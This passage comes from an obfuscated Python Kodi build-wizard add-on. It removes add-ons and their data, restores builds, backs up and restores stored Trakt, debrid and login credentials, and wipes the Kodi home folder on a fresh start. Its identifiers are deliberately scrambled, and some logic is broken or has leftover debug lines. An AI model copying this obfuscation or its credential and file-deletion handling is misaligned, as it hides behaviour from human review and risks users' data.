		def onAction (OOOO00O00OOOOO000 ,OO0OOOOO0000O00O0 ):#line:4642
			if OO0OOOOO0000O00O0 ==ACTION_PREVIOUS_MENU :OOOO00O00OOOOO000 .close ()#line:4643
			elif OO0OOOOO0000O00O0 ==ACTION_NAV_BACK :OOOO00O00OOOOO000 .close ()#line:4644
	if default ==None :default =wiz .Grab_Log (True )#line:4645
	O0O0OO0OO00OOOO0O =OOOOOOOOO0O0OO00O ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4646
	O0O0OO0OO00OOOO0O .doModal ()#line:4647
	del O0O0OO0OO00OOOO0O #line:4648
def removeAddon (O0O00OOOO00OO0OO0 ,OO00O0000O0OOOO00 ,over =False ):#line:4650
	if not over ==False :#line:4651
		OOOOOO0O00OO0OOOO =1 #line:4652
	else :#line:4653
		OOOOOO0O00OO0OOOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OO00O0000O0OOOO00 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,O0O00OOOO00OO0OO0 ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4654
	if OOOOOO0O00OO0OOOO ==1 :#line:4655
		O0OOO0OO0O0O00OO0 =os .path .join (ADDONS ,O0O00OOOO00OO0OO0 )#line:4656
		wiz .log ("Removing Addon %s"%O0O00OOOO00OO0OO0 )#line:4657
		wiz .cleanHouse (O0OOO0OO0O0O00OO0 )#line:4658
		xbmc .sleep (1000 )#line:4659
		try :shutil .rmtree (O0OOO0OO0O0O00OO0 )#line:4660
		except Exception as O00OO000O0OOOO0O0 :wiz .log ("Error removing %s"%O0O00OOOO00OO0OO0 ,xbmc .LOGNOTICE )#line:4661
		removeAddonData (O0O00OOOO00OO0OO0 ,OO00O0000O0OOOO00 ,over )#line:4662
	if over ==False :#line:4663
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,OO00O0000O0OOOO00 ))#line:4664
def removeAddonData (OO0O0OOO0OO000O0O ,name =None ,over =False ):#line:4666
	if OO0O0OOO0OO000O0O =='all':#line:4667
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4668
			wiz .cleanHouse (ADDOND )#line:4669
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4670
	elif OO0O0OOO0OO000O0O =='uninstalled':#line:4671
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4672
			OOOO0O0O00OOOO00O =0 #line:4673
			for OOOOO0O000000O0OO in glob .glob (os .path .join (ADDOND ,'*')):#line:4674
				OO0O00000O0OO00O0 =OOOOO0O000000O0OO .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4675
				if OO0O00000O0OO00O0 in EXCLUDES :pass #line:4676
				elif os .path .exists (os .path .join (ADDONS ,OO0O00000O0OO00O0 )):pass #line:4677
				else :wiz .cleanHouse (OOOOO0O000000O0OO );OOOO0O0O00OOOO00O +=1 ;wiz .log (OOOOO0O000000O0OO );shutil .rmtree (OOOOO0O000000O0OO )#line:4678
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OOOO0O0O00OOOO00O ))#line:4679
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4680
	elif OO0O0OOO0OO000O0O =='empty':#line:4681
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4682
			OOOO0O0O00OOOO00O =wiz .emptyfolder (ADDOND )#line:4683
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OOOO0O0O00OOOO00O ))#line:4684
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4685
	else :#line:4686
		OOO0O0O00O0O0OO00 =os .path .join (USERDATA ,'addon_data',OO0O0OOO0OO000O0O )#line:4687
		if OO0O0OOO0OO000O0O in EXCLUDES :#line:4688
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4689
		elif os .path .exists (OOO0O0O00O0O0OO00 ):#line:4690
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0O0OOO0OO000O0O ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4691
				wiz .cleanHouse (OOO0O0O00O0O0OO00 )#line:4692
				try :#line:4693
					shutil .rmtree (OOO0O0O00O0O0OO00 )#line:4694
				except :#line:4695
					wiz .log ("Error deleting: %s"%OOO0O0O00O0O0OO00 )#line:4696
			else :#line:4697
				wiz .log ('Addon data for %s was not removed'%OO0O0OOO0OO000O0O )#line:4698
	wiz .refresh ()#line:4699
def restoreit (O0O00000O0OO0OO00 ):#line:4701
	if O0O00000O0OO0OO00 =='build':#line:4702
		OO00OOOO0O0OOOO00 =freshStart ('restore')#line:4703
		if OO00OOOO0O0OOOO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4704
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4705
		wiz .skinToDefault ()#line:4706
	wiz .restoreLocal (O0O00000O0OO0OO00 )#line:4707
def restoreextit (O000OOOO0OOO00O0O ):#line:4709
	if O000OOOO0OOO00O0O =='build':#line:4710
		O00OOO0OO00O0O0O0 =freshStart ('restore')#line:4711
		if O00OOO0OO00O0O0O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4712
	wiz .restoreExternal (O000OOOO0OOO00O0O )#line:4713
def buildInfo (OO00O0OOOO0OOOOOO ):#line:4715
	if wiz .workingURL (SPEEDFILE )==True :#line:4716
		if wiz .checkBuild (OO00O0OOOO0OOOOOO ,'url'):#line:4717
			OO00O0OOOO0OOOOOO ,O0O00OO0O0OOOO00O ,O000OO00OOO0OOO0O ,OO000O0O00OOOOOO0 ,O0OOO00O0O0000O00 ,O0OO0OO00OOO000O0 ,OO000O0O0OO0O0000 ,O00OO00O0000000OO ,O0O0O0OO0O00O0O00 ,O0000OOO000000OOO ,OOO00O00OOO000O00 =wiz .checkBuild (OO00O0OOOO0OOOOOO ,'all')#line:4718
			O0000OOO000000OOO ='Yes'if O0000OOO000000OOO .lower ()=='yes'else 'No'#line:4719
			O00O0O0OOO0000OO0 ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO00O0OOOO0OOOOOO )#line:4720
			O00O0O0OOO0000OO0 +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O00OO0O0OOOO00O )#line:4721
			if not O0OO0OO00OOO000O0 =="http://":#line:4722
				O0O00O0000O00OOOO =wiz .themeCount (OO00O0OOOO0OOOOOO ,False )#line:4723
				O00O0O0OOO0000OO0 +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (O0O00O0000O00OOOO ))#line:4724
			O00O0O0OOO0000OO0 +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OOO00O0O0000O00 )#line:4725
			O00O0O0OOO0000OO0 +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0000OOO000000OOO )#line:4726
			O00O0O0OOO0000OO0 +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO00O00OOO000O00 )#line:4727
			wiz .TextBox (ADDONTITLE ,O00O0O0OOO0000OO0 )#line:4728
		else :wiz .log ("Invalid Build Name!")#line:4729
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4730
def buildVideo (OO0O0000O00O0O00O ):#line:4732
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4733
	if wiz .workingURL (SPEEDFILE )==True :#line:4734
		OOOOOO0OOOOO0OOO0 =wiz .checkBuild (OO0O0000O00O0O00O ,'preview')#line:4735
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%OO0O0000O00O0O00O )#line:4736
		if OOOOOO0OOOOO0OOO0 and not OOOOOO0OOOOO0OOO0 =='http://':playVideo (OOOOOO0OOOOO0OOO0 )#line:4737
		else :wiz .log ("[%s]Unable to find url for video preview"%OO0O0000O00O0O00O )#line:4738
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4739
def dependsList (O0O00000O00000OO0 ):#line:4741
	O00000OO0000OO0O0 =os .path .join (ADDONS ,O0O00000O00000OO0 ,'addon.xml')#line:4742
	if os .path .exists (O00000OO0000OO0O0 ):#line:4743
		OOOO0OOO00000OOOO =open (O00000OO0000OO0O0 ,mode ='r');OO0000OO00O00000O =OOOO0OOO00000OOOO .read ();OOOO0OOO00000OOOO .close ();#line:4744
		OOOO00OOO0O0OO0OO =wiz .parseDOM (OO0000OO00O00000O ,'import',ret ='addon')#line:4745
		O00O0OO00O00000O0 =[]#line:4746
		for O0OO0O000O00OO000 in OOOO00OOO0O0OO0OO :#line:4747
			if not 'xbmc.python'in O0OO0O000O00OO000 :#line:4748
				O00O0OO00O00000O0 .append (O0OO0O000O00OO000 )#line:4749
		return O00O0OO00O00000O0 #line:4750
	return []#line:4751
def manageSaveData (OOOOOO000OO0OOO0O ):#line:4753
	if OOOOOO000OO0OOO0O =='import':#line:4754
		O0O0000OOO0OOO000 =os .path .join (ADDONDATA ,'temp')#line:4755
		if not os .path .exists (O0O0000OOO0OOO000 ):os .makedirs (O0O0000OOO0OOO000 )#line:4756
		O00OO0OOOO0O00OOO =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4757
		if not O00OO0OOOO0O00OOO .endswith ('.zip'):#line:4758
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4759
			return #line:4760
		O00OOO00OO0O0OO00 =os .path .join (MYBUILDS ,'SaveData.zip')#line:4761
		OOOO0O000O0OO0000 =xbmcvfs .copy (O00OO0OOOO0O00OOO ,O00OOO00OO0O0OO00 )#line:4762
		wiz .log ("%s"%str (OOOO0O000O0OO0000 ))#line:4763
		extract .all (xbmc .translatePath (O00OOO00OO0O0OO00 ),O0O0000OOO0OOO000 )#line:4764
		OO0O00OOO0O0OO0O0 =os .path .join (O0O0000OOO0OOO000 ,'trakt')#line:4765
		OOO00OOOOOOO000OO =os .path .join (O0O0000OOO0OOO000 ,'login')#line:4766
		OOO00000000O00000 =os .path .join (O0O0000OOO0OOO000 ,'debrid')#line:4767
		OOO0O00OOOOOOOOO0 =0 #line:4768
		if os .path .exists (OO0O00OOO0O0OO0O0 ):#line:4769
			OOO0O00OOOOOOOOO0 +=1 #line:4770
			OO0O00O0O0O00000O =os .listdir (OO0O00OOO0O0OO0O0 )#line:4771
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4772
			for OO0000O0OO0OOOO0O in OO0O00O0O0O00000O :#line:4773
				O00O0000OO0O00000 =os .path .join (traktit .TRAKTFOLD ,OO0000O0OO0OOOO0O )#line:4774
				O0OO0OOOO00O00O00 =os .path .join (OO0O00OOO0O0OO0O0 ,OO0000O0OO0OOOO0O )#line:4775
				if os .path .exists (O00O0000OO0O00000 ):#line:4776
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO0000O0OO0OOOO0O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4777
					else :os .remove (O00O0000OO0O00000 )#line:4778
				shutil .copy (O0OO0OOOO00O00O00 ,O00O0000OO0O00000 )#line:4779
			traktit .importlist ('all')#line:4780
			traktit .traktIt ('restore','all')#line:4781
		if os .path .exists (OOO00OOOOOOO000OO ):#line:4782
			OOO0O00OOOOOOOOO0 +=1 #line:4783
			OO0O00O0O0O00000O =os .listdir (OOO00OOOOOOO000OO )#line:4784
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4785
			for OO0000O0OO0OOOO0O in OO0O00O0O0O00000O :#line:4786
				O00O0000OO0O00000 =os .path .join (loginit .LOGINFOLD ,OO0000O0OO0OOOO0O )#line:4787
				O0OO0OOOO00O00O00 =os .path .join (OOO00OOOOOOO000OO ,OO0000O0OO0OOOO0O )#line:4788
				if os .path .exists (O00O0000OO0O00000 ):#line:4789
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO0000O0OO0OOOO0O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4790
					else :os .remove (O00O0000OO0O00000 )#line:4791
				shutil .copy (O0OO0OOOO00O00O00 ,O00O0000OO0O00000 )#line:4792
			loginit .importlist ('all')#line:4793
			loginit .loginIt ('restore','all')#line:4794
		if os .path .exists (OOO00000000O00000 ):#line:4795
			OOO0O00OOOOOOOOO0 +=1 #line:4796
			OO0O00O0O0O00000O =os .listdir (OOO00000000O00000 )#line:4797
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4798
			for OO0000O0OO0OOOO0O in OO0O00O0O0O00000O :#line:4799
				O00O0000OO0O00000 =os .path .join (debridit .REALFOLD ,OO0000O0OO0OOOO0O )#line:4800
				O0OO0OOOO00O00O00 =os .path .join (OOO00000000O00000 ,OO0000O0OO0OOOO0O )#line:4801
				if os .path .exists (O00O0000OO0O00000 ):#line:4802
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO0000O0OO0OOOO0O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4803
					else :os .remove (O00O0000OO0O00000 )#line:4804
				shutil .copy (O0OO0OOOO00O00O00 ,O00O0000OO0O00000 )#line:4805
			debridit .importlist ('all')#line:4806
			debridit .debridIt ('restore','all')#line:4807
		wiz .cleanHouse (O0O0000OOO0OOO000 )#line:4808
		wiz .removeFolder (O0O0000OOO0OOO000 )#line:4809
		os .remove (O00OOO00OO0O0OO00 )#line:4810
		if OOO0O00OOOOOOOOO0 ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4811
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4812
	elif OOOOOO000OO0OOO0O =='export':#line:4813
		O00OOOOOOOO0O0OO0 =xbmc .translatePath (MYBUILDS )#line:4814
		O0OOO0OOO0OOO0O00 =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4815
		traktit .traktIt ('update','all')#line:4816
		loginit .loginIt ('update','all')#line:4817
		debridit .debridIt ('update','all')#line:4818
		O00OO0OOOO0O00OOO =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4819
		O00OO0OOOO0O00OOO =xbmc .translatePath (O00OO0OOOO0O00OOO )#line:4820
		O000O0O0O0O000000 =os .path .join (O00OOOOOOOO0O0OO0 ,'SaveData.zip')#line:4821
		OO0OOOOO000OOOO0O =zipfile .ZipFile (O000O0O0O0O000000 ,mode ='w')#line:4822
		for O00OO0OO0OO000OO0 in O0OOO0OOO0OOO0O00 :#line:4823
			if os .path .exists (O00OO0OO0OO000OO0 ):#line:4824
				OO0O00O0O0O00000O =os .listdir (O00OO0OO0OO000OO0 )#line:4825
				for OOO000O0000O0O0O0 in OO0O00O0O0O00000O :#line:4826
					OO0OOOOO000OOOO0O .write (os .path .join (O00OO0OO0OO000OO0 ,OOO000O0000O0O0O0 ),os .path .join (O00OO0OO0OO000OO0 ,OOO000O0000O0O0O0 ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4827
		OO0OOOOO000OOOO0O .close ()#line:4828
		if O00OO0OOOO0O00OOO ==O00OOOOOOOO0O0OO0 :#line:4829
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000O0O0O0O000000 ))#line:4830
		else :#line:4831
			try :#line:4832
				xbmcvfs .copy (O000O0O0O0O000000 ,os .path .join (O00OO0OOOO0O00OOO ,'SaveData.zip'))#line:4833
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O00OO0OOOO0O00OOO ,'SaveData.zip')))#line:4834
			except :#line:4835
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000O0O0O0O000000 ))#line:4836
def freshStart (install =None ,over =False ):#line:4841
	if USERNAME =='':#line:4842
		ADDON .openSettings ()#line:4843
		sys .exit ()#line:4844
	O00O0OO0O0OOOO000 =(SPEEDFILE )#line:4845
	(O00O0OO0O0OOOO000 )#line:4846
	OO00000000OO0OO00 =(wiz .workingURL (O00O0OO0O0OOOO000 ))#line:4847
	(OO00000000OO0OO00 )#line:4848
	if KEEPTRAKT =='true':#line:4849
		traktit .autoUpdate ('all')#line:4850
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4851
	if KEEPREAL =='true':#line:4852
		debridit .autoUpdate ('all')#line:4853
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4854
	if KEEPLOGIN =='true':#line:4855
		loginit .autoUpdate ('all')#line:4856
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4857
	if over ==True :OO0OOO0O0O0O0OOOO =1 #line:4858
	elif install =='restore':OO0OOO0O0O0O0OOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4859
	elif install :OO0OOO0O0O0O0OOOO =1 #line:4860
	else :OO0OOO0O0O0O0OOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4861
	if OO0OOO0O0O0O0OOOO :#line:4862
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4863
			OO000OOO00OO0O0OO ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4864
			skinSwitch .swapSkins (OO000OOO00OO0O0OO )#line:4867
			OO0OO00OOO0O000OO =0 #line:4868
			xbmc .sleep (1000 )#line:4869
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO0OO00OOO0O000OO <150 :#line:4870
				OO0OO00OOO0O000OO +=1 #line:4871
				xbmc .sleep (1000 )#line:4872
				wiz .ebi ('SendAction(Select)')#line:4873
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4874
				wiz .ebi ('SendClick(11)')#line:4875
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4876
			xbmc .sleep (1000 )#line:4877
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4878
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4879
			return #line:4880
		wiz .addonUpdates ('set')#line:4881
		O00OO00O00OO0OOO0 =os .path .abspath (HOME )#line:4882
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4883
		OO000OOOOOO00OO0O =sum ([len (O00OOO00OO00O000O )for O0O0O0OO0000000OO ,OOO0OO0OOO0O00000 ,O00OOO00OO00O000O in os .walk (O00OO00O00OO0OOO0 )]);OO0OO000000O00OO0 =0 #line:4884
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4885
		EXCLUDES .append ('My_Builds')#line:4886
		EXCLUDES .append ('archive_cache')#line:4887
		EXCLUDES .append ('script.module.requests')#line:4888
		EXCLUDES .append ('myfav.anon')#line:4889
		if KEEPREPOS =='true':#line:4890
			O0O0000000OOOO00O =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4891
			for OOO0OOOO0O00OO0OO in O0O0000000OOOO00O :#line:4892
				O00O000OO0O0O0OO0 =os .path .split (OOO0OOOO0O00OO0OO [:-1 ])[1 ]#line:4893
				if not O00O000OO0O0O0OO0 ==EXCLUDES :#line:4894
					EXCLUDES .append (O00O000OO0O0O0OO0 )#line:4895
		if KEEPSUPER =='true':#line:4896
			EXCLUDES .append ('plugin.program.super.favourites')#line:4897
		if KEEPMOVIELIST =='true':#line:4898
			EXCLUDES .append ('plugin.video.metalliq')#line:4899
		if KEEPMOVIELIST =='true':#line:4900
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4901
		if KEEPADDONS =='true':#line:4902
			EXCLUDES .append ('addons')#line:4903
		if KEEPTELEMEDIA =='true':#line:4904
			EXCLUDES .append ('plugin.video.telemedia')#line:4905
		EXCLUDES .append ('plugin.video.elementum')#line:4910
		EXCLUDES .append ('script.elementum.burst')#line:4911
		EXCLUDES .append ('script.elementum.burst-master')#line:4912
		EXCLUDES .append ('plugin.video.quasar')#line:4913
		EXCLUDES .append ('script.quasar.burst')#line:4914
		EXCLUDES .append ('skin.estuary')#line:4915
		if KEEPWHITELIST =='true':#line:4918
			OO00O0OO00O000000 =''#line:4919
			O0OO0O0OO000OOO0O =wiz .whiteList ('read')#line:4920
			if len (O0OO0O0OO000OOO0O )>0 :#line:4921
				for OOO0OOOO0O00OO0OO in O0OO0O0OO000OOO0O :#line:4922
					try :OOOOOO0O000O00OOO ,OOOO0O0000O0OO0O0 ,OO00O0000O00OO0O0 =OOO0OOOO0O00OO0OO #line:4923
					except :pass #line:4924
					if OO00O0000O00OO0O0 .startswith ('pvr'):OO00O0OO00O000000 =OOOO0O0000O0OO0O0 #line:4925
					OOO000OO0OO00O0OO =dependsList (OO00O0000O00OO0O0 )#line:4926
					for OO00OOO00OOO0O000 in OOO000OO0OO00O0OO :#line:4927
						if not OO00OOO00OOO0O000 in EXCLUDES :#line:4928
							EXCLUDES .append (OO00OOO00OOO0O000 )#line:4929
						OO0O0OO0O00O0OOO0 =dependsList (OO00OOO00OOO0O000 )#line:4930
						for OOO00O0O0OOOOO000 in OO0O0OO0O00O0OOO0 :#line:4931
							if not OOO00O0O0OOOOO000 in EXCLUDES :#line:4932
								EXCLUDES .append (OOO00O0O0OOOOO000 )#line:4933
					if not OO00O0000O00OO0O0 in EXCLUDES :#line:4934
						EXCLUDES .append (OO00O0000O00OO0O0 )#line:4935
				if not OO00O0OO00O000000 =='':wiz .setS ('pvrclient',OO00O0000O00OO0O0 )#line:4936
		if wiz .getS ('pvrclient')=='':#line:4937
			for OOO0OOOO0O00OO0OO in EXCLUDES :#line:4938
				if OOO0OOOO0O00OO0OO .startswith ('pvr'):#line:4939
					wiz .setS ('pvrclient',OOO0OOOO0O00OO0OO )#line:4940
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4941
		OO0OO000O00OO0000 =wiz .latestDB ('Addons')#line:4942
		for O0O00OO0O00OO0OOO ,O000OO000000OOOOO ,OO00O00O0OO00O000 in os .walk (O00OO00O00OO0OOO0 ,topdown =True ):#line:4943
			O000OO000000OOOOO [:]=[OOOO0O0O0O00OO000 for OOOO0O0O0O00OO000 in O000OO000000OOOOO if OOOO0O0O0O00OO000 not in EXCLUDES ]#line:4944
			for OOOOOO0O000O00OOO in OO00O00O0OO00O000 :#line:4945
				OO0OO000000O00OO0 +=1 #line:4946
				OO00O0000O00OO0O0 =O0O00OO0O00OO0OOO .replace ('/','\\').split ('\\')#line:4947
				OO0OO00OOO0O000OO =len (OO00O0000O00OO0O0 )-1 #line:4949
				if OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -2 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00O0000O00OO0O0 [OO0OO00OOO0O000OO ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4950
				elif OOOOOO0O000O00OOO =='MyVideos99.db'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4951
				elif OOOOOO0O000O00OOO =='MyVideos107.db'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4952
				elif OOOOOO0O000O00OOO =='MyVideos116.db'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4953
				elif OOOOOO0O000O00OOO =='MyVideos99.db'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -1 ]=='userdata'and OO00O0000O00OO0O0 [OO0OO00OOO0O000OO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0O00OO0O00OO0OOO ,OOOOOO0O000O00OOO ),xbmc .LOGNOTICE )#line:4954
